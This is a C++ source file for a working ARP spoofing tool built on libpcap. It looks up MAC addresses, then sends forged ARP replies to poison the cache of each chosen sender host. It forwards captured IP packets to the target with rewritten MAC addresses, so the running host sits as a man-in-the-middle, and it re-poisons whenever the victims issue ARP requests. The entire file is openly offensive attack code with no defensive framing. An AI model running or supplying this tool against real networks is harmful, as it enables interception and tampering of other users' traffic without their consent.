#include "MyARP.h"
#include <glog/logging.h>

#define MAX_SESSION_NUM 100

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int thread_idx= 0;
bool isSpoofing;
IPaddr sender_ip[MAX_SESSION_NUM], target_ip[MAX_SESSION_NUM], attacker_ip;
HWaddr sender_ha[MAX_SESSION_NUM], target_ha[MAX_SESSION_NUM], attacker_ha;
char *interface;

bool ARPCachePoisoning(pcap_t *handle, const HWaddr sha, const IPaddr sip, const HWaddr aha, const IPaddr tip)
{
    ARPpkt pkt;

    makeARPPacket(&pkt, aha, tip, sha, sip, ARPOP_REPLY);
    if(pcap_sendpacket(handle, (u_char *)&pkt, sizeof(pkt)) != 0)
    {
        LOG(FATAL) << "pcap_sendpacket : failed";
        return false;
    }
    return true;
}

void *ARPSpoofing(void *)
{
    IPaddr sip, tip;
    HWaddr sha, tha;
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    int res;
    struct ether_header *eth_hdr;
    struct pcap_pkthdr      *header;
    const u_char            *pkt;
    ARPpkt *arppkt;

    pthread_mutex_lock(&mutex);
    sip = sender_ip[thread_idx];
    tip = target_ip[thread_idx];
    sha = sender_ha[thread_idx];
    tha = target_ha[thread_idx];
    thread_idx++;
    pthread_mutex_unlock(&mutex);
    
    if((handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf))==NULL)
    {
        LOG(FATAL) << "pcap_open_live : failed";
        return NULL;
    }

    if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
    {
        LOG(FATAL) << "ARPCachePoisoning : failed";
        return NULL;
    }

    while(isSpoofing)
    {
        res = pcap_next_ex(handle, &header, &pkt);

        if(res == 0)
        {
            continue;
        }

        if(res < 0)
        {
            LOG(FATAL) << "pcap_next_ex : failed";
            return NULL;
        }

        eth_hdr = (struct ether_header *) pkt;

        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP)
        {
            memcpy(eth_hdr->ether_shost, &attacker_ha, HW_ADDR_LEN);
            memcpy(eth_hdr->ether_dhost, &tha, HW_ADDR_LEN);

            if(pcap_sendpacket(handle, pkt, header->len) != 0)
            {
                LOG(FATAL) << "pcap_sendpacket : failed";
                return NULL;
            }    
        }

        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP)
        {
            arppkt = (ARPpkt *) pkt;
            if( (equalHWaddr(arppkt->arp_addr.sha, tha) && equalIPaddr(arppkt->arp_addr.tip, sip)) ||\
                (equalHWaddr(arppkt->arp_addr.sha, sha) && equalIPaddr(arppkt->arp_addr.tip, tip)) )
            {
                if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
                {
                    LOG(FATAL) << "ARPCachePoisoning : failed";
                    return NULL;
                }       
            }
        }
    }

    pcap_close(handle);

    pthread_exit(NULL);
}

int main(int argc, char **argv)
{
    int         session_num;
    pcap_t      *handle;
    char        errbuf[PCAP_ERRBUF_SIZE];
    pthread_t   threads[MAX_SESSION_NUM];
    int         i;

    google::InitGoogleLogging(argv[0]);

    if(argc < 4 || argc > 2 + 2*MAX_SESSION_NUM || argc%2 == 1)
    {
        printf("Usage : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ... <sender ip 100> <target ip 100>]", argv[0]);
        return -1;
    }

    session_num = argc/2 - 1;
    interface = argv[1];

    getMyIPaddr(&attacker_ip, interface);
    getMyHWaddr(&attacker_ha, interface);

    LOG(INFO) << "attacker_ip : " << inet_ntoa(attacker_ip);
    LOG(INFO) << "attacker_ha : " << ether_ntoa(&attacker_ha);

    if((handle = pcap_open_live(interface,  BUFSIZ, 1, 1000, errbuf))==NULL)
    {
        LOG(FATAL) << "pcap_open_live : failed";
        return -1;
    }

    for(i=0;i<session_num;i++)
    {
        inet_pton(AF_INET, argv[i*2 + 2], &sender_ip[i]);
        inet_pton(AF_INET, argv[i*2 + 3], &target_ip[i]);
        
        if(!getHWaddrByIPaddr(&sender_ha[i], handle, attacker_ha, attacker_ip, sender_ip[i]))
        {
            LOG(FATAL) << "getHWaddrbyIPaddr : failed";
            return -1;
        }
        if(!getHWaddrByIPaddr(&target_ha[i], handle, attacker_ha, attacker_ip, target_ip[i]))
        {
            LOG(FATAL) << "getHWaddrbyIPaddr : failed";
            return -1;
        }

        LOG(INFO) << "sender_ip[" << i << "] : " << inet_ntoa(sender_ip[i]);
        LOG(INFO) << "target_ip[" << i << "] : " << inet_ntoa(target_ip[i]);
        LOG(INFO) << "sender_ha[" << i << "] : " << ether_ntoa(&sender_ha[i]);
        LOG(INFO) << "target_ha[" << i << "] : " << ether_ntoa(&target_ha[i]);
    }

    pcap_close(handle);

    isSpoofing = true;

    for(i=0;i<session_num;i++)
    {
        pthread_create(&threads[i], NULL, ARPSpoofing, NULL);
    }

    printf("Press any button to stop ARP spoofing\n");
    getchar();

    isSpoofing = false;

    return 0;
}